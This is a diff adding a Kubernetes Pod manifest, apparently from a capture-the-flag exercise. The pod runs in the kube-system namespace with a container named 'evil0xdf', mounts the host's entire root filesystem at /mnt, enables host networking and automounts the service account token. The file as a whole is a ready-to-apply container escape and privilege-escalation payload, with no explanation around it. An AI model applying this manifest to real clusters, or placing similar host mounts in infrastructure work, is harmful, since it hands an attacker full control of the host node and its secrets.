@@ -1,0 +1,20 @@
+apiVersion: v1 
+kind: Pod
+metadata:
+  name: alpine
+  namespace: kube-system
+spec:
+  containers:
+  - name: evil0xdf
+    image: localhost:5000/dev-alpine
+    command: ["/bin/sh"]
+    args: ["-c", "sleep 300000"]
+    volumeMounts: 
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:  
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
